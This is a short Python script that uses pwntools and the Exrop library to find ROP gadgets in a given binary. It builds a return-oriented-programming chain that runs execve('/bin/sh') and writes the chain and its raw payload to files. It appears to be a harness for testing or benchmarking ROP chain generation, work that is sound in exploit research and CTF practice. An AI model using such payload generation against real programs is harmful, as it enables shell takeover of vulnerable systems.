from pwn import *
from Exrop import Exrop
from io import StringIO
import time
import sys

binary = sys.argv[1]
ropchain_path = sys.argv[2]

elf = ELF(binary)
rwaddr = elf.bss()
rop = Exrop(binary)
rop.find_gadgets(cache=False, num_process=1)
# execve is 59 syscall on x86_64
chain = rop.syscall(59, ("/bin/sh", 0, 0), rwaddr)

script_path = "{}.exrop.script".format(binary)
with open(script_path, 'w') as script:
    stdout = sys.stdout
    sys.stdout = StringIO()
    chain.dump()
    output = sys.stdout.getvalue()
    sys.stdout = stdout
    script.write(output)

with open(ropchain_path, 'wb') as ropchain_f:
    payload = chain.payload_str()
    ropchain_f.write(payload)

